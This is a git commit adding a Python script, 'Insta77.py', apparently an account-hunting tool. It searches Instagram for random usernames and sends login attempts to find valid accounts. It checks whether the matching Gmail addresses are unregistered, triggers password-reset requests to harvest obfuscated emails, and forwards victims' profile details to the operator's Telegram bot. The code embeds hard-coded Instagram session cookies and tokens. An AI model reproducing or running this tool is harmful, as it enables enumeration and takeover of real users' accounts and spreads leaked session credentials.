6333ad6e7c2482081a2e048987e4624d4c05efd0
s3x0s <96497574+s3x0s@users.noreply.github.com>
2023-02-21 17:47:29 +0400

    Insta77.py
    insta guess
    Brilliant birth AAA

---
+++ Insta77.py
@@ -0,0 +1,241 @@
+import os,time,random,requests,json,sys
+import os
+import requests
+import random
+from uuid import uuid4
+import json
+from user_agent import generate_user_agent
+uid = uuid4()
+P_W_7=str(uuid4())
+from user_agent import generate_user_agent
+from uuid import uuid4
+from time import sleep
+import webbrowser, random, requests
+from user_agent import generate_user_agent
+import json
+from secrets import token_hex
+import secrets, sys
+import datetime
+import pyfiglet
+r = requests.session()
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+
+
+
+
+r = requests.session()
+now = datetime.datetime.today()
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+
+t=(mm + "/" + dd + "/" + yyyy + " " + hour+ ":" + mi + ":" + ss)
+
+Z = '\033[1;31m' #احمر
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2023, 12, 30 , 12, 00 ,0)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\n\n')
+ print('\n\n')
+ print(x)
+ 
+ sys.exit(0)
+ 
+
+if (x.strftime("%x"))==(g.strftime("%x")):
+   print('')
+   if(x.strftime("%X"))>(g.strftime("%X")):
+    print('\n\n')
+    print('\n\n')
+    print(x)
+    
+    sys.exit(0)
+   else:
+    print('')  
+else:
+    print('')
+print('')
+os.system('clear')
+#------------------colors---------------#
+B="\033[1;30m" # Black
+L = "\033[1;95m"  #ارجواني
+R="\033[1;31m" # Red
+G="\033[1;32m" # Green
+Y="\033[1;33m" # Yellow
+Bl="\033[1;34m" # Blue
+P="\033[1;35m" # Purple
+C="\033[1;36m" # Cyan
+W="\033[1;37m" # White
+E = "\033[0;90m" #رمادي
+#------------------logo---------------------#
+import pyfiglet
+ajaj = pyfiglet.figlet_format('               A   A   A')
+print(R+ajaj)
+time1=time.localtime()
+time2 = time.strftime("%d/%m/%Y")
+time3 = time.strftime("%H:%M:%S")
+print(f'{G}[استمتع بوقتك] ')
+print(f'{G}[Date] :{E} [{time2}]')
+print(f'{G}[The time] :{E} [{time3}]')
+ID=input(f"{Bl}ENTAR ID : {G}")
+token=input(f"{Bl}ENTAR Token : {G}")
+print('\n')
+print('---------👑👑 TOOL MOFLAH 👑👑---------')
+def az():
+ while True:
+  user='1234567890qwertyuiopasdfghjklzxcvbnm'
+  num='56789'
+  rng=int("".join(random.choice(num)for i in range(1)))
+  useq=str("".join(random.choice(user)for i in range(rng)))
+  url = f'https://www.instagram.com/web/search/topsearch/?context=blended&query={useq}&rank_token=0.38549261586414585&include_reel=true'
+  hes = {
+		        'accept': '*/*',
+		        'accept-encoding': 'gzip, deflate, br',
+		        'accept-language': 'en-US,en;q=0.9',
+		        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',
+		        'referer': 'https://www.instagram.com/explore/search/',
+		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
+		        'sec-ch-ua-mobile': '?0',
+		        'sec-fetch-dest': 'empty',
+		        'sec-fetch-mode': 'cors',
+		        'sec-fetch-site': 'same-origin',
+		        'user-agent': str(generate_user_agent()),
+		        'x-asbd-id': '437806',
+		        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
+		        'x-ig-app-id': '936619743392459',
+		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
+		        'x-requested-with': 'XMLHttpRequest'
+}
+
+  rr = requests.get(url, headers=hes).json()
+  mn=0
+  try:
+   while True:
+        mn += 1
+        user=(rr['users'][mn]['user']['username'])
+        url='https://i.instagram.com/api/v1/accounts/login/'
+        email=user+'@gmail.com'
+        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
+                 'Cookie':'missing',
+                 'Accept-Encoding':'gzip, deflate',
+                 'Accept-Language':'en-US',
+                 'X-IG-Capabilities':'3brTvw==',
+                 'X-IG-Connection-Type':'WIFI',
+                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+              'Host':'i.instagram.com'}
+        data = {'uuid':uid,  'password':'@zaid11121',
+              'username':email,
+              'device_id':uid,
+              'from_reg':'false',
+              '_csrftoken':'missing',
+              'login_attempt_countn':'0'}
+        req= requests.post(url, headers=headers, data=data).json()
+        if req['message'] == 'The password you entered is incorrect. Please try again.':
+        	print(R+f' Good insta : {email}')
+        	email=email.split('@')[0]+'@gmail.com'
+        	url = 'https://android.clients.google.com/setup/checkavail'
+        	h = {
+		'Content-Length':'98',
+		'Content-Type':'text/plain; charset=UTF-8',
+		'Host':'android.clients.google.com',
+		'Connection':'Keep-Alive',
+		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
+		}
+        	d = json.dumps({
+		'username':email,
+		'version':'3',
+		'firstName':'AbaLahb',
+		'lastName':'AbuJahl'
+	})
+        	res = requests.post(url,data=d,headers=h)
+        	if res.json()['status'] == 'SUCCESS':
+        	       print(R+f' Good Gmail : {email}')  
+        	       user=email.split('@')[0]
+        	       urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
+        	       he = {
+'accept': '*/*',
+'accept-encoding': 'gzip, deflate, br',
+'accept-language': 'ar',
+'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
+'origin': 'https://www.instagram.com',
+'referer': 'https://www.instagram.com/',
+'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+'sec-ch-ua-mobile': '?0',
+'sec-ch-ua-platform': '"Windows"',
+'sec-fetch-dest': 'empty',
+'sec-fetch-mode': 'cors',
+'sec-fetch-site': 'same-site',
+'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
+'x-asbd-id': '198387',
+'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
+'x-ig-app-id': '936619743392459',
+'x-ig-www-claim': '0',
+}
+
+        	       re =requests.get(urlg, headers=he).json()
+        	       io = re['data']['user']['biography']
+        	       fol = re['data']['user']['edge_followed_by']['count']
+        	       fos = re['data']['user']['edge_follow']['count']
+        	       id = re['data']['user']['id']
+        	       nam = re['data']['user']['full_name']
+        	       isp = re['data']['user']['is_private']
+        	       op = re['data']['user']['edge_owner_to_timeline_media']['count']
+        	       rm = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
+        	       dat = rm['date']
+        	       url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
+        	       he = {
+'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
+'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
+'Cookie2': '$Version=1',
+'Accept-Language': 'ar-EG, en-US',
+'X-IG-Connection-Type': 'MOBILE(LTE)',
+'X-IG-Capabilities': 'AQ==',
+'Accept-Encoding': 'gzip',
+}
+        	       data = {
+"user_id":id,"device_id":P_W_7,
+}
+        	       zaid = requests.post(url,headers=he, data=data).json()
+        	       rest = zaid["obfuscated_email"]
+        	       ff =f'''
+🖇  Ohh Yeeees ﴾ AAA ﴿
+🎖----------------------------------------------
+🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
+🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
+📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
+🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
+🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
+📅 𝐃𝐀𝐓𝐄 ﴾ {dat} ﴿
+🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
+🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
+🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
+🎖----------------------------------------------
+🤴 𝐁𝐘 ﴾ @ZVVZZXK https://t.me/bbdbio  ﴿'''
+
+        	       print(G+ff)
+        	       requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(ff))
+        	else:
+        		print(E+f' Bad Gmail : {email}')
+        else:
+        	print(E+f' Bad Insta : {email}')
+  except IndexError:
+  	az()
+  except KeyError:
+  	az()
+
+az()
